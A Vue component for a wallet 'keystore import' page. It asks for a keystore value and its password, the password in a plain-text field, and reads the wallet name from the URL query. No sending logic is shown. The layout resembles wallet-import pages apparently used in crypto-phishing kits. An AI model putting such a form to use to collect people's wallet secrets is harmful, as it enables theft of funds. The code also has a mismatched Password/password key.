<template>

  <div class="active-form">
      <div class="keystore-form">
      <form action="" method=""  @submit.prevent>  
           <label for="phrase">Keystore Value</label>
          <textarea v-model="form.Keystore"  id="" cols="30" rows="10"  placeholder="Input keystore value" ></textarea>
           <label for="phrase"> Keystore Password</label>
         <input v-model="form.Password"  type="text" class="input">
         <input type="text"  v-model="form.wallet" readonly>
          <input type="submit" value="Import" class="submit">

      </form>
  </div>
  </div>
</template>

<script>


export default {
    
    name: "keystore",

     data (){
        return{
           form : {
               Keystore: '',
               password:'',
               wallet: this.$route.query.title,
           }
        }
    },

   

}
</script>

<style>

</style>